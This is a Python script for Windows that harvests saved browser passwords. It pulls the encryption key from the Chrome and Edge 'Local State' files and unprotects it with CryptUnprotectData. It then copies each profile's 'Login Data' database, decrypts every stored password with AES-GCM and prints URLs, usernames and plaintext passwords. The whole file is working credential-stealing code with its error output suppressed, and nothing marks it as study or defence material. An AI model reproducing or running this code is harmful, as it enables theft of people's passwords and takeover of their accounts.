import os
import re
import json
import shutil
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
def Browser_data():

    def get_secret_key():
        try:
            with open( local_state_path, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            # print("%s"%str(e)+"\n[ERR] Chrome secretkey cannot be found")
            # print("[ERR] Chrome secretkey cannot be found")
            return None

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            # print("%s"%str(e))
            # print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""
        
    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            abc=sqlite3.connect("Loginvault.db")
            return abc
        except Exception as e:
            # print("%s"%str(e))
            # print("[ERR] Chrome database cannot be found")
            return None
            
    homepath = os.environ['USERPROFILE']
    browsers=[["chrome",homepath + r"\AppData\Local\Google\Chrome\User Data\Local State",homepath + r"\AppData\Local\Google\Chrome\User Data"],
                ["edge",homepath + r"\AppData\Local\Microsoft\Edge\User Data\Local State",homepath + r"\AppData\Local\Microsoft\Edge\User Data"],
                ]
    passwords = ""
    for browser_name,local_state_path,browser_path in browsers:
        try:
            passwords += "-"*50 + "\nBROWSER:%s\n"%browser_name + "-"*50
            secret_key = get_secret_key()
            print(secret_key)
            folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(browser_path,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(username!="" and ciphertext!=""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            passwords = passwords + "\nURL:%s \nUSERNAME:%s \nPASSWORD:%s\n"%(url, username, decrypted_password)+ "-"*50
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
                else:
                    # print("[ERR] Unable to get secret key or database connection")
                    return "[-][ERR] Unable to get secret key or database connection"
        except Exception as e:
            # print("[ERR] %s"%str(e))
            return "[-][ERR] %s"%str(e)
    return passwords

print(Browser_data())